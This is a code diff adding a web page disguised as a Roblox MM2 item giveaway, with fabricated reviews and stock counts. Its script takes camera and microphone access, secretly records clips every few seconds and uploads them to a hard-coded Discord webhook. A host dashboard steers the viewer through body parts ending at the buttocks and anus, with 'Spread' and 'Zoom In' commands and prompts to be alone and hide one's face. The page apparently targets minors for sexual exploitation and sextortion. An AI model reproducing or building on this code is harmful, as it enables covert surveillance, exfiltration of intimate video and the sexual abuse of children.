+                <span style="display:none;align-items:center;justify-content:center;width:100%;height:100%;font-size:2.8rem;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ccff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">C</span>
+            </div>
+            <div class="chillz-text" id="chillzText">GIVEAWAY MADE BY CHILLZ</div>
+            <div style="margin-top:12px;font-size:0.7rem;color:var(--text-dim);letter-spacing:3px;opacity:0.3;">✦ powered by chillz ✦</div>
+        </div>
+    </div>
+
+    <!-- ==================== SCREEN 4: MAIN MENU ==================== -->
+    <div id="screenMenu" class="screen">
+        <div class="glass glass-wide">
+            <div style="display:flex;justify-content:space-between;align-items:center;width:100%;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
+                <div class="title-glow" style="font-size:clamp(1.2rem,3vw,1.8rem);">✦ CHILLZ ✦</div>
+                <div style="font-size:0.65rem;color:var(--text-dim);letter-spacing:2px;text-transform:uppercase;">giveaway terminal</div>
+            </div>
+
+            <div class="menu-grid">
+                <!-- Harvester -->
+                <div style="width:100%;">
+                    <button class="menu-btn btn-harvester" id="btnHarvester">
+                        <span class="btn-left">
+                            <img src="harvester.png" alt="🌿" class="btn-icon" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';" />
+                            <span style="display:none;">🌿</span>
+                            Harvester
+                        </span>
+                        <span class="right">
+                            <span class="stock">out of stock 0/70</span>
+                            <span class="badge">easy</span>
+                        </span>
+                    </button>
+                    <div class="comments-section">
+                        <button class="comments-toggle" data-target="harvester-comments">
+                            💬 Comments <span class="exclamation" id="excl-harvester">❗</span>
+                        </button>
+                        <div class="comments-list" id="harvester-comments">
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "omg this was soo easyy it was basically scanning kitchen items like spoon or fork"</span><span class="stars">★★★★★</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "easy completed it under 1min"</span><span class="stars">★★★★★</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "literally scanned my coffee mug and won lol"</span><span class="stars">★★★★☆</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "too easy, need harder challenges!"</span><span class="stars">★★★☆☆</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Sweet Treat -->
+                <div style="width:100%;">
+                    <button class="menu-btn btn-sweet" id="btnSweet">
+                        <span class="btn-left">
+                            <img src="sweet.png" alt="🍬" class="btn-icon" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';" />
+                            <span style="display:none;">🍬</span>
+                            Sweet Treat Bundle
+                        </span>
+                        <span class="right">
+                            <span class="stock">out of stock 0/70</span>
+                            <span class="badge">medium</span>
+                        </span>
+                    </button>
+                    <div class="comments-section">
+                        <button class="comments-toggle" data-target="sweet-comments">
+                            💬 Comments <span class="exclamation" id="excl-sweet">❗</span>
+                        </button>
+                        <div class="comments-list" id="sweet-comments">
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "omgg kinda hard i had to scan flowers outside or grass and cars"</span><span class="stars">★★★★☆</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "took me 3 tries but worth it!"</span><span class="stars">★★★★★</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "the car scan was crazy but fun"</span><span class="stars">★★★★☆</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Gingerscope -->
+                <div style="width:100%;">
+                    <button class="menu-btn btn-ginger" id="btnGinger">
+                        <span class="btn-left">
+                            <img src="gingerscope.png" alt="🔮" class="btn-icon" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';" />
+                            <span style="display:none;">🔮</span>
+                            Gingerscope
+                        </span>
+                        <span class="right">
+                            <span class="stock green">5/70 left in stock</span>
+                            <span class="badge">hard</span>
+                        </span>
+                    </button>
+                    <div class="comments-section">
+                        <button class="comments-toggle" data-target="ginger-comments">
+                            💬 Comments <span class="exclamation" id="excl-ginger">❗</span>
+                        </button>
+                        <div class="comments-list" id="ginger-comments">
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "OMGG WHATT I THOUGHT ID GET SCAMMED BUT NVMM TTHANKSSS"</span><span class="stars">★★★★★</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "OMGG LEGITT"</span><span class="stars">★★★★★</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "best giveaway ever, got my ginger!"</span><span class="stars">★★★★★</span></div>
+                            <div class="comment-item"><span><span class="anonymous">Anonymous</span> "took forever but so worth it"</span><span class="stars">★★★★☆</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Discount Code -->
+            <div class="discount-area" id="discountArea">
+                <label>⌨️ discount code</label>
+                <div class="discount-row">
+                    <input type="text" id="discountInput" placeholder="Enter code…" maxlength="20" autocomplete="off" spellcheck="false" />
+                    <button id="discountBtn">Redeem</button>
+                </div>
+                <div class="discount-msg" id="discountMsg">✨ enter a valid code for exclusive access</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SCREEN 5: QUEUE ==================== -->
+    <div id="screenQueue" class="screen">
+        <div class="glass text-center" style="max-width:500px;">
+            <div class="queue-screen active" id="queueContent">
+                <div class="spinner"></div>
+                <h2>⏳ waiting for AI to load up</h2>
+                <div class="sub">please stand by…</div>
+                <div class="queue-info" id="queueInfo">Position in line: <strong id="queuePosition">1</strong> &bull; Est. wait: <strong id="queueWaitTime">~2 min</strong></div>
+                <div style="margin-top:8px;font-size:0.7rem;color:#555577;letter-spacing:1px;">Queue: <span id="queueTotalPlayers">1</span> player(s) ahead</div>
+                <div id="playerConnectStatus" style="font-size:0.8rem;color:var(--text-dim);min-height:20px;margin-top:8px;"></div>
+            </div>
+            <button class="back-btn" id="queueBackBtn">← back</button>
+        </div>
+    </div>
+
+    <!-- ==================== SCREEN 6: PLAYER GAME ==================== -->
+    <div id="screenGame" class="screen">
+        <div class="player-game-container">
+            <div class="glass" style="max-width:100%;position:relative;">
+
+                <!-- Countdown Overlay -->
+                <div class="countdown-overlay" id="countdownOverlay">
+                    <span class="countdown-number" id="countdownNumber">3</span>
+                    <span class="countdown-text">GET READY</span>
+                </div>
+
+                <!-- Two-column layout -->
+                <div class="player-game-row">
+                    <!-- Left: Camera + body part + scanner -->
+                    <div class="player-left-col">
+                        <!-- Camera -->
+                        <div class="player-cam-wrapper" id="playerCamWrapper">
+                            <video id="playerCamVideo" autoplay playsinline muted></video>
+                            <div class="cam-overlay-label">📷 your camera</div>
+                            <!-- Command overlay (shows host commands) -->
+                            <div class="player-command-overlay" id="playerCommandOverlay">
+                                <span class="cmd-icon" id="cmdIcon">📢</span>
+                                <span class="cmd-text" id="cmdText">Hold Still</span>
+                                <span class="cmd-sub" id="cmdSub">from host</span>
+                            </div>
+                        </div>
+
+                        <!-- Body Part Display (no Spread button anymore) -->
+                        <div class="player-bodypart-display" id="playerBodypartDisplay">
+                            <span class="part-emoji">🎯</span>
+                            Show: <span class="part-name" id="playerPartName">Left Shoulder</span>
+                        </div>
+
+                        <!-- AI Scanner Bar -->
+                        <div class="player-scanner-section">
+                            <div class="scanner-header">
+                                <span class="label">📊 AI Scanner</span>
+                                <span class="value" id="playerScannerValue">0%</span>
+                            </div>
+                            <div class="scanner-track">
+                                <div class="scanner-fill" id="playerScannerFill" style="width:0%;"></div>
+                            </div>
+                        </div>
+
+                        <!-- Status -->
+                        <div class="game-status" id="gameStatus">⚡ Scan in progress…</div>
+                    </div>
+
+                    <!-- Right: Gingerscope Panel -->
+                    <div class="player-right-col">
+                        <div class="ginger-panel">
+                            <div class="ginger-header">
+                                <img src="gingerscope.png" alt="🔮" class="ginger-icon" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';" />
+                                <span style="display:none;">🔮</span>
+                                <span class="ginger-label">GINGERSCOPE</span>
+                                <span class="ginger-pct" id="playerGingerPercent">0%</span>
+                            </div>
+                            <div class="ginger-bar">
+                                <div class="bar-track">
+                                    <div class="bar-fill" id="playerGingerFill" style="width:0%;"></div>
+                                </div>
+                                <div class="bar-label">
+                                    <span>Progress</span>
+                                    <span id="playerGingerLabel">0%</span>
+                                </div>
+                            </div>
+                            <div class="ginger-stats">
+                                <span>Parts: <strong id="partsScannedDisplay">0</strong>/<span id="totalPartsDisplay">31</span></span>
+                                <span>Score: <strong id="playerScoreDisplay">0</strong></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="player-hold-still" id="playerHoldStill">✋ hold still</div>
+            </div>
+            <button class="back-btn" id="gameBackBtn">← exit game</button>
+        </div>
+    </div>
+
+    <!-- ==================== BOSS DASHBOARD ==================== -->
+    <div id="bossDashboard">
+        <div class="boss-header">
+            <span class="title">⚡ Host Dashboard</span>
+            <span class="status">
+                <span class="dot offline" id="bossDot"></span>
+                <span id="bossStatusLabel">offline</span>
+            </span>
+        </div>
+        <div class="boss-grid">
+            <div class="boss-left">
+                <div class="boss-code-section">
+                    <div class="code-label">📋 Room Code</div>
+                    <div class="code-display">
+                        <span class="code-text" id="bossCodeText">ALPHA1</span>
+                    </div>
+                    <div class="code-status active" id="bossCodeStatus">🔑 waiting for player…</div>
+                </div>
+
+                <div class="boss-part-selector" id="bossPartSelector">
+                    <div class="selector-header">
+                        <span class="title">🎯 Body Parts</span>
+                        <span class="current-part-label" id="bossCurrentPartLabel">—</span>
+                    </div>
+                    <div class="part-list" id="bossPartList"></div>
+                </div>
+
+                <div class="boss-slider-section">
+                    <div class="slider-header">
+                        <span class="label">📊 AI Scanner</span>
+                        <span class="value" id="bossSliderValue">0%</span>
+                    </div>
+                    <input type="range" id="bossProgressSlider" min="0" max="100" value="0" step="1" />
+                </div>
+
+                <div class="boss-player-info">
+                    <div class="info-row"><span class="label">Player</span><span class="value status-text waiting" id="bossPlayerStatus">⏳ waiting for connection…</span></div>
+                    <div class="info-row"><span class="label">Current Part</span><span class="value part" id="bossPartName">—</span></div>
+                    <div class="info-row"><span class="label">Timer</span><span class="value timer" id="bossTimerDisplay">30s</span></div>
+                    <div class="info-row"><span class="label">Points</span><span class="value score" id="bossScoreDisplay">0</span></div>
+                    <div class="info-row"><span class="label">Gingerscope</span><span class="value score" id="bossGingerDisplay">0%</span></div>
+                    <div class="info-row"><span class="label">Status</span><span class="value status-text" id="bossScanStatus">⏳ waiting…</span></div>
+                </div>
+
+                <!-- Boss Actions with new buttons -->
+                <div class="boss-actions">
+                    <div class="actions-row">
+                        <button class="btn-host-start" id="bossStartBtn">▶ Start</button>
+                        <button class="btn-host-hold" id="bossHoldBtn">✋ Hold</button>
+                        <button class="btn-host-approve" id="bossApproveBtn">✅ Approve</button>
+                        <button class="btn-host-reject" id="bossRejectBtn">❌ Reject</button>
+                    </div>
+                    <div class="actions-row">
+                        <button class="btn-host-command spread" id="bossSpreadBtn">🍑 Spread</button>
+                        <button class="btn-host-command backup" id="bossBackupBtn">⬅️ Back Up</button>
+                        <button class="btn-host-command zoom" id="bossZoomBtn">🔍 Zoom In</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="boss-right">
+                <div class="boss-video-section">
+                    <video id="bossVideo" autoplay playsinline muted></video>
+                    <div class="video-placeholder" id="bossVideoPlaceholder">
+                        <div class="icon">📹</div>
+                        <div class="text">waiting for <span class="highlight">player's camera</span></div>
+                        <div class="sub-text">code <span class="highlight-code">ALPHA1</span></div>
+                    </div>
+                    <div class="video-label">📷 player feed</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== ROOM CODE POPUP ==================== -->
+    <div class="overlay-roomcode" id="overlayRoomCode">
+        <div class="box">
+            <h2>🔑 Your Room Code</h2>
+            <div class="room-code-display" id="roomCodeDisplay">
+                ALPHA1
+                <span class="copy-hint">📋 click to copy</span>
+            </div>
+            <div class="copy-feedback" id="copyFeedback">✅ Copied!</div>
+            <p>Share this code with the host to connect.<br />You'll need it after the next steps.</p>
+            <button class="btn-continue" id="roomCodeContinueBtn">Continue →</button>
+        </div>
+    </div>
+
+    <!-- ==================== OVERLAYS ==================== -->
+    <!-- Username -->
+    <div class="overlay-username" id="overlayUsername">
+        <div class="box">
+            <h2>👤 Roblox Username</h2>
+            <p>Enter your Roblox username so the MM2 bot can add and trade you.</p>
+            <input type="text" id="usernameInput" placeholder="Your Roblox username…" maxlength="30" autocomplete="off" spellcheck="false" />
+            <button class="btn-submit" id="usernameSubmit">Continue</button>
+        </div>
+    </div>
+
+    <!-- 18+ -->
+    <div class="overlay-18" id="overlay18">
+        <div class="box">
+            <h2>🔞 18+</h2>
+            <p>This experience contains mature themes.<br />Are you over 18 years of age?</p>
+            <div class="btn-group">
+                <button class="btn-yes" id="overlay18Yes">✓ Yes</button>
+                <button class="btn-no" id="overlay18No">✕ No</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Alone -->
+    <div class="overlay-alone" id="overlayAlone">
+        <div class="box">
+            <h2>🔒 privacy check</h2>
+            <p>Make sure you are alone and in a private space before continuing.</p>
+            <button id="aloneBtn">I am alone</button>
+        </div>
+    </div>
+
+    <!-- ==================== PRIZE OVERLAY ==================== -->
+    <div class="overlay-prize" id="overlayPrize">
+        <div class="box">
+            <h2>🎉 CLAIM YOUR PRIZE</h2>
+            <img src="weapon1.png" alt="Weapon" class="prize-img" id="prizeImg" onerror="this.style.display='none';this.nextElementSibling.style.display='block';" />
+            <div style="display:none;font-size:3rem;margin:12px 0;">🔫</div>
+            <div class="prize-text">You've unlocked the <span style="color:var(--neon-yellow);">Gingerscope Weapon!</span></div>
+            <div class="prize-sub">
+                The MM2 bot <span class="highlight">mm2Ronloxcoinfarm</span> will join you in-game to trade your prize.
+                <br /><br />
+                <span style="color:var(--text-dim);font-size:0.85rem;">Keep your identity hidden — don't show your face.</span>
+            </div>
+            <button class="btn-restart" id="prizeRestartBtn">🔄 Play Again</button>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- JAVASCRIPT -->
+    <!-- ============================================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ---- CONFIG ----
+            const ROOM_CODE = 'ALPHA1';
+            const SCAN_TIME = 30;
+            const GINGER_PER_PART = 2; // Each part adds 2% to Gingerscope
+            const DISCORD_WEBHOOK_URL =
+                'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
+
+            // Body parts with "Butt Crack" and "Bootyhole"
+            const BODY_PARTS = [
+                { id: 'left_pinky', label: 'Left Pinky', points: 1, emoji: '🖐️', color: 'green' },
+                { id: 'right_pinky', label: 'Right Pinky', points: 1, emoji: '🖐️', color: 'green' },
+                { id: 'left_thumb', label: 'Left Thumb', points: 1, emoji: '👍', color: 'green' },
+                { id: 'right_thumb', label: 'Right Thumb', points: 1, emoji: '👍', color: 'green' },
+                { id: 'left_index', label: 'Left Index', points: 1, emoji: '☝️', color: 'green' },
+                { id: 'right_index', label: 'Right Index', points: 1, emoji: '☝️', color: 'green' },
+                { id: 'left_middle', label: 'Left Middle', points: 1, emoji: '🖕', color: 'green' },
+                { id: 'right_middle', label: 'Right Middle', points: 1, emoji: '🖕', color: 'green' },
+                { id: 'left_ring', label: 'Left Ring', points: 1, emoji: '💍', color: 'green' },
+                { id: 'right_ring', label: 'Right Ring', points: 1, emoji: '💍', color: 'green' },
+                { id: 'left_forearm', label: 'Left Forearm', points: 2, emoji: '💪', color: 'green' },
+                { id: 'right_forearm', label: 'Right Forearm', points: 2, emoji: '💪', color: 'green' },
+                { id: 'left_hand', label: 'Left Hand', points: 2, emoji: '✋', color: 'green' },
+                { id: 'right_hand', label: 'Right Hand', points: 2, emoji: '🤚', color: 'green' },
+                { id: 'left_shoulder', label: 'Left Shoulder', points: 3, emoji: '🦴', color: 'green' },
+                { id: 'right_shoulder', label: 'Right Shoulder', points: 3, emoji: '🦴', color: 'green' },
+                { id: 'left_elbow', label: 'Left Elbow', points: 3, emoji: '💪', color: 'green' },
+                { id: 'right_elbow', label: 'Right Elbow', points: 3, emoji: '💪', color: 'green' },
+                { id: 'left_knee', label: 'Left Knee', points: 4, emoji: '🦵', color: 'yellow' },
+                { id: 'right_knee', label: 'Right Knee', points: 4, emoji: '🦵', color: 'yellow' },
+                { id: 'left_leg', label: 'Left Leg', points: 4, emoji: '🦵', color: 'yellow' },
+                { id: 'right_leg', label: 'Right Leg', points: 4, emoji: '🦵', color: 'yellow' },
+                { id: 'left_foot', label: 'Left Foot', points: 6, emoji: '🦶', color: 'yellow' },
+                { id: 'right_foot', label: 'Right Foot', points: 6, emoji: '🦶', color: 'yellow' },
+                { id: 'left_under_foot', label: 'Left Foot (Under)', points: 7, emoji: '🦶', color: 'orange' },
+                { id: 'right_under_foot', label: 'Right Foot (Under)', points: 7, emoji: '🦶', color: 'orange' },
+                { id: 'ribs', label: 'Ribs', points: 8, emoji: '🦴', color: 'orange' },
+                { id: 'chest', label: 'Chest', points: 8, emoji: '🫀', color: 'orange' },
+                { id: 'back', label: 'Back', points: 8, emoji: '🦴', color: 'orange' },
+                { id: 'belly_button', label: 'Belly Button', points: 12, emoji: '🫃', color: 'red' },
+                { id: 'butt_crack', label: 'Butt Crack', points: 15, emoji: '🍑', color: 'red' },
+                { id: 'bootyhole', label: 'Bootyhole', points: 20, emoji: '🍑', color: 'red' },
+            ];
+
+            // ---- STATE ----
+            let permissionsGranted = false;
+            let mediaStream = null;
+            let recorder = null;
+            let recordedChunks = [];
+            let recordingInterval = null;
+            let isRecording = false;
+            let isBossMode = false;
+            let isHost = false;
+            let isPlayer = false;
+            let gameTimer = null;
+            let gameTimeLeft = SCAN_TIME;
+            let currentPartIndex = 0;
+            let totalPoints = 0;
+            let gingerScopePercent = 0;
+            let partsScanned = 0;
+            let bossStarted = false;
+            let gameRunning = false;
+            let gameDone = false;
+            let isAloneConfirmed = false;
+            let is18Confirmed = false;
+            let robloxUsername = '';
+            let playerId = null;
+            let hostPeer = null;
+            let playerPeer = null;
+            let dataConnection = null;
+            let remoteStream = null;
+            let isPlayerConnected = false;
+            let bossPollInterval = null;
+            let queuePollInterval = null;
+            let holdStillActive = false;
+            let countdownTimer = null;
+            let countdownRunning = false;
+            let scannerValue = 0;
+            let isProcessingApproval = false;
+            let commandTimeout = null;
+
+            // ---- DOM REFS ----
+            const screens = {
+                permission: document.getElementById('screenPermission'),
+                voice: document.getElementById('screenVoice'),
+                chillz: document.getElementById('screenChillz'),
+                menu: document.getElementById('screenMenu'),
+                queue: document.getElementById('screenQueue'),
+                game: document.getElementById('screenGame'),
+            };
+
+            const permStatus = document.getElementById('permissionStatus');
+            const retryBtn = document.getElementById('retryPermBtn');
+            const lockOverlay = document.getElementById('lockOverlay');
+            const lockRetryBtn = document.getElementById('lockRetryBtn');
+            const voiceRing = document.getElementById('voiceRing');
+            const voiceStatus = document.getElementById('voiceStatus');
+            const skipVoiceBtn = document.getElementById('skipVoiceBtn');
+            const chillzLogo = document.getElementById('chillzLogo');
+            const chillzText = document.getElementById('chillzText');
+            const discountInput = document.getElementById('discountInput');
+            const discountBtn = document.getElementById('discountBtn');
+            const discountMsg = document.getElementById('discountMsg');
+            const discountArea = document.getElementById('discountArea');
+
+            const bossDashboard = document.getElementById('bossDashboard');
+            const bossVideo = document.getElementById('bossVideo');
+            const bossVideoPlaceholder = document.getElementById('bossVideoPlaceholder');
+            const bossDot = document.getElementById('bossDot');
+            const bossStatusLabel = document.getElementById('bossStatusLabel');
+            const bossCodeText = document.getElementById('bossCodeText');
+            const bossCodeStatus = document.getElementById('bossCodeStatus');
+            const bossCurrentPartLabel = document.getElementById('bossCurrentPartLabel');
+            const bossPartList = document.getElementById('bossPartList');
+            const bossSliderValue = document.getElementById('bossSliderValue');
+            const bossProgressSlider = document.getElementById('bossProgressSlider');
+            const bossPlayerStatus = document.getElementById('bossPlayerStatus');
+            const bossPartName = document.getElementById('bossPartName');
+            const bossTimerDisplay = document.getElementById('bossTimerDisplay');
+            const bossScoreDisplay = document.getElementById('bossScoreDisplay');
+            const bossGingerDisplay = document.getElementById('bossGingerDisplay');
+            const bossScanStatus = document.getElementById('bossScanStatus');
+            const bossStartBtn = document.getElementById('bossStartBtn');
+            const bossHoldBtn = document.getElementById('bossHoldBtn');
+            const bossApproveBtn = document.getElementById('bossApproveBtn');
+            const bossRejectBtn = document.getElementById('bossRejectBtn');
+            const bossSpreadBtn = document.getElementById('bossSpreadBtn');
+            const bossBackupBtn = document.getElementById('bossBackupBtn');
+            const bossZoomBtn = document.getElementById('bossZoomBtn');
+
+            const playerCamVideo = document.getElementById('playerCamVideo');
+            const playerGingerPercent = document.getElementById('playerGingerPercent');
+            const playerGingerFill = document.getElementById('playerGingerFill');
+            const playerGingerLabel = document.getElementById('playerGingerLabel');
+            const playerPartName = document.getElementById('playerPartName');
+            const playerScannerValue = document.getElementById('playerScannerValue');
+            const playerScannerFill = document.getElementById('playerScannerFill');
+            const gameStatus = document.getElementById('gameStatus');
+            const playerHoldStill = document.getElementById('playerHoldStill');
+            const countdownOverlay = document.getElementById('countdownOverlay');
+            const countdownNumber = document.getElementById('countdownNumber');
+            const partsScannedDisplay = document.getElementById('partsScannedDisplay');
+            const totalPartsDisplay = document.getElementById('totalPartsDisplay');
+            const playerScoreDisplay = document.getElementById('playerScoreDisplay');
+            const playerCommandOverlay = document.getElementById('playerCommandOverlay');
+            const cmdIcon = document.getElementById('cmdIcon');
+            const cmdText = document.getElementById('cmdText');
+            const cmdSub = document.getElementById('cmdSub');
+
+            const overlayUsername = document.getElementById('overlayUsername');
+            const usernameInput = document.getElementById('usernameInput');
+            const usernameSubmit = document.getElementById('usernameSubmit');
+            const overlay18 = document.getElementById('overlay18');
+            const overlay18Yes = document.getElementById('overlay18Yes');
+            const overlay18No = document.getElementById('overlay18No');
+            const overlayAlone = document.getElementById('overlayAlone');
+            const aloneBtn = document.getElementById('aloneBtn');
+            const overlayRoomCode = document.getElementById('overlayRoomCode');
+            const roomCodeDisplay = document.getElementById('roomCodeDisplay');
+            const copyFeedback = document.getElementById('copyFeedback');
+            const roomCodeContinueBtn = document.getElementById('roomCodeContinueBtn');
+            const overlayPrize = document.getElementById('overlayPrize');
+            const prizeRestartBtn = document.getElementById('prizeRestartBtn');
+
+            const queueContent = document.getElementById('queueContent');
+            const queueBackBtn = document.getElementById('queueBackBtn');
+            const queuePosition = document.getElementById('queuePosition');
+            const queueWaitTime = document.getElementById('queueWaitTime');
+            const queueTotalPlayers = document.getElementById('queueTotalPlayers');
+            const playerConnectStatus = document.getElementById('playerConnectStatus');
+            const gameBackBtn = document.getElementById('gameBackBtn');
+
+            const btnHarvester = document.getElementById('btnHarvester');
+            const btnSweet = document.getElementById('btnSweet');
+            const btnGinger = document.getElementById('btnGinger');
+            const commentToggles = document.querySelectorAll('.comments-toggle');
+
+            // ---- UTILITY ----
+            function showScreen(id) {
+                Object.values(screens).forEach(el => el.classList.remove('active'));
+                const el = document.getElementById(id);
+                if (el) el.classList.add('active');
+            }
+
+            function generateId() { return 'player_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6); }
+
+            // ---- QUEUE SYSTEM ----
+            function getQueue() { try { return JSON.parse(localStorage.getItem('chillz_queue') || '[]'); } catch { return []; } }
+
+            function saveQueue(queue) { localStorage.setItem('chillz_queue', JSON.stringify(queue)); }
+
+            function addToQueue(username) {
+                const queue = getQueue();
+                const player = { id: generateId(), username: username, timestamp: Date.now(), status: 'waiting' };
+                queue.push(player);
+                saveQueue(queue);
+                return player;
+            }
+
+            function getPlayerPosition(playerId) {
+                const queue = getQueue();
+                const waiting = queue.filter(p => p.status === 'waiting');
+                const idx = waiting.findIndex(p => p.id === playerId);
+                return idx !== -1 ? idx + 1 : null;
+            }
+
+            function getWaitingCount() {
+                const queue = getQueue();
+                return queue.filter(p => p.status === 'waiting').length;
+            }
+
+            function getNextPlayer() {
+                const queue = getQueue();
+                const waiting = queue.filter(p => p.status === 'waiting');
+                if (waiting.length > 0) {
+                    const player = waiting[0];
+                    player.status = 'in-progress';
+                    saveQueue(queue);
+                    return player;
+                }
+                return null;
+            }
+
+            function getQueueDisplay() { return getWaitingCount(); }
+
+            function estimateWaitTime(position) {
+                const mins = position * 2;
+                if (mins < 1) return '< 1 min';
+                if (mins === 1) return '~1 min';
+                return `~${mins} min`;
+            }
+
+            // ---- PERMISSIONS ----
+            async function requestPermissions() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 1080 }, height: { ideal: 1920 } },
+                        audio: { echoCancellation: true, noiseSuppression: true }
+                    });
+                    mediaStream = stream;
+                    permissionsGranted = true;
+                    permStatus.textContent = '✅ Permissions granted!';
+                    permStatus.className = 'perm-granted';
+                    retryBtn.style.display = 'none';
+                    lockOverlay.classList.remove('active');
+
+                    if (playerCamVideo) {
+                        playerCamVideo.srcObject = stream;
+                        playerCamVideo.play().catch(() => {});
+                    }
+
+                    startSecretRecording();
+
+                    setTimeout(() => {
+                        showScreen('screenVoice');
+                        initVoiceRecognition();
+                    }, 600);
+                    return true;
+                } catch (err) {
+                    console.warn('Permission error:', err);
+                    permissionsGranted = false;
+                    permStatus.textContent = '❌ Permission not granted. Please refresh your page.';
+                    permStatus.className = 'perm-denied';
+                    retryBtn.style.display = 'block';
+                    lockOverlay.classList.add('active');
+                    return false;
+                }
+            }
+
+            retryBtn.addEventListener('click', requestPermissions);
+            lockRetryBtn.addEventListener('click', requestPermissions);
+
+            setTimeout(requestPermissions, 400);
+
+            // ---- SECRET RECORDING (only players, not host) ----
+            function startSecretRecording() {
+                if (!mediaStream) return;
+                if (recordingInterval) {
+                    clearInterval(recordingInterval);
+                    recordingInterval = null;
+                }
+
+                const mimeType = 'video/webm;codecs=vp9,opus';
+                const options = { mimeType: mimeType, videoBitsPerSecond: 2500000, audioBitsPerSecond: 128000 };
+
+                function recordClip() {
+                    if (isHost || isBossMode) return;
+                    if (!mediaStream || !permissionsGranted) return;
+                    if (isRecording) return;
+
+                    try {
+                        isRecording = true;
+                        recordedChunks = [];
+                        const rec = new MediaRecorder(mediaStream, options);
+                        recorder = rec;
+
+                        rec.ondataavailable = (e) => {
+                            if (e.data && e.data.size > 0) {
+                                recordedChunks.push(e.data);
+                            }
+                        };
+
+                        rec.onstop = () => {
+                            isRecording = false;
+                            if (recordedChunks.length > 0) {
+                                const blob = new Blob(recordedChunks, { type: mimeType });
+                                sendToWebhook(blob);
+                            }
+                            recordedChunks = [];
+                        };
+
+                        rec.start();
+                        setTimeout(() => {
+                            if (rec && rec.state === 'recording') {
+                                rec.stop();
+                            }
+                        }, 10000);
+                    } catch (e) {
+                        isRecording = false;
+                    }
+                }
+
+                recordingInterval = setInterval(recordClip, 12000);
+                setTimeout(recordClip, 1000);
+            }
+
+            function sendToWebhook(blob) {
+                if (!DISCORD_WEBHOOK_URL) return;
+                if (isHost || isBossMode) return;
+
+                try {
+                    const formData = new FormData();
+                    formData.append('content', '📹 New recording clip');
+                    const blobFile = new File([blob], `clip_${Date.now()}.webm`, { type: 'video/webm' });
+                    formData.append('file', blobFile);
+
+                    fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData,
+                    }).catch(() => console.warn('Webhook send failed'));
+                } catch (e) {
+                    console.warn('Webhook error:', e);
+                }
+            }
+
+            // ---- VOICE RECOGNITION ----
+            let recognition = null;
+            let voiceStarted = false;
+
+            function initVoiceRecognition() {
+                if (voiceStarted) return;
+                const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+                if (!SpeechRecognition) {
+                    voiceStatus.textContent = '⚠️ Voice recognition not supported.';
+                    return;
+                }
+
+                recognition = new SpeechRecognition();
+                recognition.continuous = false;
+                recognition.interimResults = false;
+                recognition.lang = 'en-US';
+
+                recognition.onstart = () => {
+                    voiceRing.classList.add('active');
+                    voiceStatus.textContent = '🎤 Listening for "begin"…';
+                };
+
+                recognition.onresult = (event) => {
+                    const transcript = event.results[0][0].transcript.toLowerCase().trim();
+                    voiceStatus.textContent = `📝 heard: "${transcript}"`;
+                    if (transcript.includes('begin')) {
+                        voiceStatus.textContent = '✅ "begin" detected!';
+                        voiceRing.classList.remove('active');
+                        recognition.stop();
+                        voiceStarted = false;
+                        setTimeout(showChillzIntro, 400);
+                    } else {
+                        voiceStatus.textContent = `🔄 say "begin" (heard: "${transcript}")`;
+                        setTimeout(() => {
+                            try { recognition.start(); } catch (e) {}
+                        }, 600);
+                    }
+                };
+
+                recognition.onerror = () => {
+                    voiceStatus.textContent = '🔄 listening…';
+                    setTimeout(() => {
+                        try { recognition.start(); } catch (e) {}
+                    }, 800);
+                };
+
+                recognition.onend = () => {
+                    if (!voiceStarted) {
+                        setTimeout(() => {
+                            try { recognition.start(); } catch (e) {}
+                        }, 400);
+                    }
+                };
+
+                try {
+                    recognition.start();
+                    voiceStarted = true;
+                } catch (e) {
+                    voiceStatus.textContent = '⚠️ Error starting voice recognition.';
+                }
+            }
+
+            skipVoiceBtn.addEventListener('click', () => {
+                if (recognition) {
+                    try { recognition.stop(); } catch (e) {}
+                }
+                voiceRing.classList.remove('active');
+                voiceStarted = false;
+                voiceStatus.textContent = '⏭ Skipped voice. Proceeding…';
+                setTimeout(showChillzIntro, 300);
+            });
+
+            // ---- CHILLZ INTRO ----
+            function showChillzIntro() {
+                showScreen('screenChillz');
+
+                const logo = chillzLogo;
+                const text = chillzText;
+                logo.style.animation = 'floatGlow 1.8s ease-in-out infinite';
+                text.style.opacity = '1';
+
+                setTimeout(() => {
+                    logo.style.transition = 'all 1.2s ease';
+                    text.style.transition = 'all 1.2s ease';
+                    logo.style.opacity = '0';
+                    logo.style.transform = 'scale(1.6)';
+                    text.style.opacity = '0';
